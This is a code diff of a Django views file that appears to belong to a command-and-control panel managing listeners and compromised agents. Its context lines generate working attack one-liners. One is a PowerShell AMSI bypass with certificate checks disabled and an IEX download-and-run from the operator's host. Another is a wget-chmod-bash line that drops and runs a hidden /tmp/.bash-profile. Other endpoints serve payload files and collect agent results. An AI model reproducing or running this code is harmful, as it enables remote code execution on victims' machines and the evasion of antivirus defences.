@@ -1,5 +1,4 @@
 import base64
-from django.conf import settings
 from django.contrib.auth.decorators import login_required
 from django.shortcuts import render 
 from .forms import *
@@ -11,21 +10,14 @@ import string
 from django.http import HttpResponse , JsonResponse
 from django.views import View
 from flask import Flask
-import threading
-import sys
-from multiprocessing import Process
 from django.contrib.auth.models import User
-from django.http import HttpResponseRedirect 
-from .forms import UploadFileForm
 from rest_framework.response import Response
-from rest_framework import status
 from rest_framework.views import APIView
 from .serializers import *
 from datetime import datetime
 
 current_path= os.path.dirname(os.path.abspath(__file__))
-
-listen_path = os.path.dirname(os.path.abspath(__file__))+"/data/listeners/"
+listen_path = current_path +"/data/listeners/"
 app         = Flask(__name__)
 port = 8000
 
@@ -102,15 +94,12 @@ class Listener():
             eth = request.POST['listener']      
             netifaces.ifaddresses(eth)
             ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
-            #output_path= "/tmp/Win-{}".format(eth)
             with open(os.path.dirname(os.path.abspath(__file__))+"/powershell.ps1","rt") as p:
                 payload = p.read()
             payload = payload.replace('REPLACE_IP',ip)
             payload = payload.replace('REPLACE_PORT',str(port))
             payload = payload.replace('REPLACE_INTERFACE',eth)
-            # with open(output_path,"wt") as R:
-            #     R.write(payload)
-
+        
             with open(listen_path+"/Win-{}".format(eth),"wt") as R:
                 R.write(payload)
 
@@ -119,7 +108,7 @@ class Listener():
                 listener.ip = ip
                 listener.save()
             amsi= '$apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields(\'NonPublic,Static\');ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true);'
-            noCheckCert= '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = ${\ttrue };'
+            noCheckCert= '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};'
             oneliner = "{} {} IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/sc/{}\')".format(amsi,noCheckCert,ip, str(port), eth)
             return JsonResponse({"payload" : oneliner} , status=200)
 
@@ -135,15 +124,12 @@ class Listener():
             eth = request.POST['listener']
             netifaces.ifaddresses(eth)
             ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
-            #output_path= "/tmp/Lin-{}".format(eth)
             with open(os.path.dirname(os.path.abspath(__file__))+"/bash","rt") as p:
                 payload = p.read()
             payload = payload.replace('REPLACE_IP',ip)
             payload = payload.replace('REPLACE_PORT',str(port))
             payload = payload.replace('REPLACE_INTERFACE',eth)
-            # with open(output_path,"wt") as R:
-            #     R.write(payload)
-
+   
             with open(listen_path+"/Lin-{}".format(eth),"wt") as R:
                 R.write(payload)
                 
@@ -154,7 +140,6 @@ class Listener():
                 
             oneliner = "wget --no-check-certificate https://{}:{}/lin_download/{} -O /tmp/.bash-profile;chmod +x /tmp/.bash-profile;bash /tmp/.bash-profile".format(ip, str(port), eth)
             return JsonResponse({"payload" : oneliner} , status=200)
-            #return render(request,'blog/lin_payload-Gen.html', {'payloadline':oneliner})
 
         def get(self,request):
             return render(request,'blog/lin_payload-Gen.html')
@@ -184,7 +169,6 @@ class Listener():
 
 # execute payload windows content to get the connection to our server
         def win_sendFile(request, eth=''):
-            # output_path= "Win-{}".format(eth)
             f    = open(listen_path+"/Win-{}".format(eth), "rt")
             data = f.read()
             f.close()
@@ -192,7 +176,6 @@ class Listener():
         
 # execute payload linux content to get the connection to our server
         def lin_sendFile(request, eth=''):
-            # output_path= "/tmp/Lin-{}".format(eth)
             f    = open(listen_path+"/Lin-{}".format(eth), "rt")
             data = f.read()
             f.close()
@@ -253,11 +236,8 @@ def LoginPage(request):
 def HomePage(request):
     listeners = ListenerForm.objects.all()
     agents = Agent.objects.all()
-    #request.session['test'] = "Helo"
     response = render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners) , "agents" : list(agents) } )
-    #response.set_cookie( 'test' , 'hello' )
     return response
-    #return render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners)} )
 
 @login_required
 def AgentPage(request):
@@ -289,7 +269,6 @@ class GetFileResult(APIView):
         f = open("{}".format(current_path+"/data/listeners/agents/"+ name + "/results"), "rt")
         strFile = ''
         for lines in f.readlines():
-            #strFile+="<pre class='my-0 py-0'>" + lines + "</pre>"
             strFile += lines
         task = f.read()
         f.close()   
